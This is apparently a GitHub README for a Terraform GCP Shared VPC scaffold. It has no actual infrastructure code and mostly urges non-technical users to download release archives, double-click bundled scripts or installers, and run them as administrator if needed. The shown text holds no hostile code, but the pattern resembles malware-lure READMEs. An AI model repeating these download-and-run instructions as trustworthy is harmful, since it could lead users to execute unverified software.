<a href="https://github.com/DiihOliver/terraform-gcp-shared-vpc-scaffold/releases"><img src="https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge" alt="Download Releases"></a>

# terraform-gcp-shared-vpc-scaffold

A production-ready Terraform scaffold for deploying applications on Google Cloud Platform (GCP) with a secure Shared VPC architecture. This boilerplate gives reusable modules and multi-environment examples (dev/prod) for GKE and Cloud Run. It helps teams adopt infrastructure-as-code best practices.

## 🧭 What this is and who it is for
This project is a collection of Terraform code and example configs. It helps you create a secure network and deploy sample apps on GCP. It works for people who must set up GCP projects, networks, and basic workloads. You do not need programming knowledge to download and run the packaged demo files. The release includes a guided demo that shows the scaffold in action.

Topics: cloud-dns, cloud-run, cloud-sql, cloudflare, gcp, gke, iac, kubernetes, landing-zone, networking, production-ready, scaffold, shared-vpc, terraform, terraform-modules

## 🚀 Getting Started
This guide shows how to download the release and run the included demo. Follow the steps in order. If you run into trouble, use the Troubleshooting section.

High-level flow:
1. Visit the Releases page.
2. Download the release asset for your operating system.
3. Extract the files.
4. Run the included demo script or use the included installer.

## ⬇️ Download & Install
Action: visit this page to download:
- Release page: https://github.com/DiihOliver/terraform-gcp-shared-vpc-scaffold/releases

Steps for non-technical users (GUI method)
1. Open your web browser.
2. Go to the release page: https://github.com/DiihOliver/terraform-gcp-shared-vpc-scaffold/releases
3. Look for the latest release entry. It will show one or more download assets.
4. Click the asset that matches your system. Common names:
   - Windows: terraform-gcp-shared-vpc-scaffold-windows.zip
   - macOS: terraform-gcp-shared-vpc-scaffold-macos.zip
   - Linux: terraform-gcp-shared-vpc-scaffold-linux.tar.gz
5. Save the file to your Downloads folder.
6. Double-click the downloaded file to extract it.
7. Open the extracted folder and find the file named `RUN-DEMO` or `run-demo.bat` (Windows) / `run-demo.sh` (macOS, Linux).
8. Double-click the run script (Windows) or follow the Quick Demo steps below for macOS/Linux.

Optional terminal method (for users who can follow a few commands)
- macOS / Linux:
  - Open Terminal.
  - Change to the folder where you extracted the files: `cd ~/Downloads/terraform-gcp-shared-vpc-scaffold`
  - Make the demo script executable: `chmod +x run-demo.sh`
  - Start the demo: `./run-demo.sh`
- Windows (PowerShell)
  - Open PowerShell.
  - Change to the extracted folder: `cd $HOME\Downloads\terraform-gcp-shared-vpc-scaffold`
  - Run: `.\run-demo.bat`

If the release includes an installer, run that installer and follow the on-screen prompts.

## ⚙️ System requirements (typical)
- A web browser
- 4 GB free disk space
- Internet connection
- For full deploy to GCP:
  - A Google account with billing enabled
  - A GCP project (the demo can create a temporary project)
  - Optional: Docker Desktop (for local demo) or a basic terminal
- Windows 10 or later, macOS 10.15+ or a recent Linux distribution

These requirements cover the packaged demo. Full production deployment needs more resources and an administrator.

## 📦 What’s included in a typical release
The release bundles a curated set of files so non-technical users can try the scaffold without writing Terraform:

- README files with step-by-step instructions
- A guided demo script: `run-demo.sh` or `run-demo.bat`
- A simple GUI or text installer for demo setup (Windows executable or macOS app)
- Example configuration files for dev and prod
- A pre-built demo manifest that simulates GKE or Cloud Run deployment
- A small local emulator or Docker Compose file to run sample services locally
- A scripts folder with helper scripts for setup and teardown

The demo scripts use pre-built artifacts. They do not require you to write code.

## 🧩 Quick demo (no Terraform knowledge required)
Follow these steps after you extract the release:

1. Open the extracted folder.
2. Find `RUN-DEMO` or `run-demo.bat` / `run-demo.sh`.
3. On Windows: double-click `run-demo.bat` and allow it to run.
4. On macOS/Linux:
   - Open Terminal.
   - `cd` into the folder.
   - Run `chmod +x run-demo.sh` then `./run-demo.sh`.
5. The demo script will:
   - Show a short menu with choices (example: "Local demo" or "Cloud demo").
   - For Local demo, start a small local environment using Docker Compose.
   - For Cloud demo, open a browser window that guides you through connecting to your GCP account and granting limited permissions.
6. Follow the on-screen prompts. When the demo finishes, it shows a URL or local port where you can see a sample app.

The demo runs safe commands. It uses temporary resources and cleans up after you if you choose that option.

## 🔐 Configure access to GCP (simple)
If you want to try the cloud demo, you will need a Google account and a billing-enabled project. Here is a short checklist:

1. Sign in to https://console.cloud.google.com
2. Create a project or use an existing project.
3. Enable billing for the project.
4. Enable the APIs the demo asks for (the demo links to the right API pages).
5. The demo may ask you to grant limited permissions. The script will explain each permission and why it needs it.

If you do not want to use cloud resources, select the Local demo option.

## ❓ Troubleshooting
- The demo script does not start:
  - On macOS/Linux make sure the file is executable: `chmod +x run-demo.sh`
  - On Windows, run from PowerShell as an administrator if needed.
- The demo fails when calling GCP:
  - Confirm you signed in to the correct Google account.
  - Confirm billing is active on the selected project.
- Docker errors:
  - Install Docker Desktop and restart your machine.
  - Ensure Docker is running before starting the demo.
- Disk space or permissions:
  - Free up at least 4 GB.
  - Run the script from your user folder, not from a system folder.

If an error message appears, copy the full message and open an Issue in the repository. Provide the message and the operating system name and version.

## 📚 Frequently asked questions
- Q: Do I need to know Terraform?
  - A: No. The demo uses pre-built artifacts so you can see the scaffold in action. The code is included if you want to learn later.
- Q: Will this cost money?
  - A: The local demo is free. Cloud demo may create small GCP resources which can cost money. The demo offers a cleanup option to remove resources.
- Q: Can I use this for production?
  - A: The scaffold targets production patterns. Use it with an experienced cloud admin for production deployments.

## 🤝 Contributing
Contributions help the project improve. If you want to help:
1. Fork the repository on GitHub.
2. Create a branch for your change.
3. Open a pull request with a clear title and description.

For non-technical contributors: you can help by improving documentation, reporting issues, or testing the release on different systems.

## 📬 Support
If you need help:
- Visit the release page to download assets: https://github.com/DiihOliver/terraform-gcp-shared-vpc-scaffold/releases
- Open an Issue on the repository with details and the demo log.

When you create an issue, include:
- Your operating system (Windows, macOS, Linux)
- The demo script name you ran
- The full error text or a screenshot

## 📄 License
This project uses the MIT license. Check the LICENSE file in the release for full terms.